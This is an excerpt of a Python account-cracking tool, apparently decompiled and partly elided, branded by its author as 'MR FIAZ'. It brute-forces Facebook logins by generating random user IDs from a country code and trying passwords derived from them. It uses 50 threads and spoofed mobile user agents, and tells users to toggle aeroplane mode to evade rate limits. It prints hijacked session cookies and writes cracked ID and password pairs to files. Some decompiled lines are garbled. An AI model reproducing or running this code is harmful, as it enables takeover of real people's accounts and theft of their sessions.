...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;37m [1] CONTACT ME ON WHATSAPP')
    print(' [2] EXIT')
    opt = input('\n  \x1b[1;32m Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://wa.me/+19852483755')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def o():
    ...
    print('')
    jalan('\x1b[1;37m [1]\x1b[1;33m RANDOM CRACK ')
    jalan(' \x1b[1;37m[0] \x1b[1;31mEXIT')
    opt = input('\n   \x1b[1;32m Choose option >>> ')
    if opt == '1':
        i()
    if None == '2':
...
\033[1;35m##    ##    ##    ##     ## ##       ##    ##  
 \033[1;32m######     ##    ########  ######## ##     ## 
\033[1;37m-----------------------------------------------------
\033[1;37m [+] AUTHOR     :  MR FIAZ NIAZI 
\033[1;37m [+] FACEBOOK   :  MUHAMMAD FIAZ KHAN 
\033[1;37m [+] GITHUB     :  MR-F1AZ-XD
\033[1;37m [+] TEAM       :  CYBER SQUAD 
\033[1;37m [+] VERSION    :  3.8
\033[1;37m-----------------------------------------------------
\33[37;41m\tWELLCOME TO MY TOOL<=====>MR F1AZ H3R3\33[0;m
\033[1;37m-----------------------------------------------------\n""")
loop = 0
oks = []
cps = []
...
for xd in range(10000):
    ...
    l='105.0.0.0 Mobile Safari/537.36'
...
def i():
    ...
    jalan("\033[1;37m\t  USE YOUR COUNTRY CODE  ")
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\033[1;32m USE AEROPLANE MODE IN EVERY 5 MIN ')
        print('\033[1;37m-----------------------------------------------------')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(' \033[1;32m[FIAZ-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/FIAZ-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(' \33[1;31m[FIAZ-CP]  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/FIAZ-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s FIAZ %s/%s [ OK:%s - CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x)),
        sys.stdout.flush()
    except:
        pass
